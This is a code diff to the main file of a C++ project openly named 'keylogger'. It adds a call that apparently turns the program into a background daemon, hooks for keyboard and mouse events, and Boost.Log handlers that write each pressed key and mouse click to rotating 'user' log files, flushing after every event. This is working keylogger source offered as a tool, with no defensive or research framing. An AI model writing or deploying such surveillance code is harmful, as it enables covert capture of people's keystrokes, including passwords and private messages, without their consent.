@@ -8,38 +8,41 @@
 #include <boost/log/sources/record_ostream.hpp>
 
 #include <keylogger/hooks/keyboard.hpp>
+#include <keylogger/hooks/mouse.hpp>
+#include <keylogger/utils/utils.hpp>
 
 namespace logging = boost::log;
 namespace src = boost::log::sources;
 namespace sinks = boost::log::sinks;
 namespace keywords = boost::log::keywords;
 
-void init() {
-    logging::add_file_log(
-            keywords::file_name = "sample_%N.log",
+int main(int, char* []) {
+    Utils::CreateDemon();
+
+    auto sink = logging::add_file_log(
+            keywords::file_name = "user_%N.log",
             keywords::rotation_size = 10 * 1024 * 1024,
             keywords::time_based_rotation = sinks::file::rotation_at_time_point(0, 0, 0),
             keywords::format = "[%TimeStamp%]: %Message%"
     );
-}
-
-int main(int, char* []) {
-    init();
     logging::add_common_attributes();
 
     using namespace logging::trivial;
     src::severity_logger<severity_level> lg;
 
-    BOOST_LOG_SEV(lg, trace) << "A trace severity message";
-    BOOST_LOG_SEV(lg, debug) << "A debug severity message";
-    BOOST_LOG_SEV(lg, info) << "An informational severity message";
-    BOOST_LOG_SEV(lg, warning) << "A warning severity message";
-    BOOST_LOG_SEV(lg, error) << "An error severity message";
-    BOOST_LOG_SEV(lg, fatal) << "A fatal severity message";
-
     KeyboardEvents keyboard;
-    keyboard.ConnectHandler([](Event& ev){
-       std::cout << static_cast<KeyboardEvent&>(ev).key << std::endl;
+    keyboard.ConnectHandler([&lg, &sink](Event& ev){
+        BOOST_LOG_SEV(lg, info) << "User pressed: " + ((KeyboardEvent&)ev).key;
+        sink->flush();
+    });
+
+    MouseEvents mouse;
+    mouse.ConnectHandler([&lg, &sink](Event& ev){
+        BOOST_LOG_SEV(lg, info) <<
+            "User clicked: " + std::string(((MouseEvent&)ev).rightButtonClicked
+                ? "Right button pressed"
+                : "Left button pressed");
+        sink->flush();
     });
 
     while(true){}
